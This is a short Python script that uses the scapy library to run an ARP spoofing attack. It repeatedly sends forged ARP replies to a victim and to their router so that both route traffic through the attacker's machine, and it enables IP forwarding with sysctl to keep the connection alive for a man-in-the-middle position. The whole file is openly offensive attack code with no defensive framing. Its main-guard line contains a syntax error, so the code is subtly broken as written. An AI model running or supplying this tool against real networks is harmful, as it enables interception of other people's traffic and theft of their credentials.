# This is a ARP response program for Spoofing
# That is for Attacker acting as Router
from scapy.all import *

router_ip = input("Enter the IP of router: ")
victim_ip = input("Enter the IP of victim: ")
attacker_mac = input("Enter the MAC address of attacker: ")
victim_mac = input("Enter the MAC address of victim: ")
router_mac = input("Enter the MAC address of Router: ")

def spoof_victim():         # Victim Spoof
    arp_layer = ARP()
    arp_layer.psrc = router_ip
    arp_layer.pdst = victim_ip
    arp_layer.hwsrc = attacker_mac
    arp_layer.hwdst = victim_mac
    arp_layer.op = 2    # As this is a response ARP
    send(arp_layer)
def spoof_router():         #Router Spoof
    arp_response = ARP()
    arp_response.op = 2
    arp_response.psrc = victim_ip
    arp_response.pdst = router_ip
    arp_response.hwdst = router_mac
    arp_response.hwsrc = attacker_mac
    send(arp_response)

def forwarding():
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"])
if __name__ = "__main__":
    forwarding()
    try:
        while True:
            spoof_victim()
            spoof_router()
            time.sleep(2)
    except KeyboardInterrupt as err:
        print("Exiting.........")
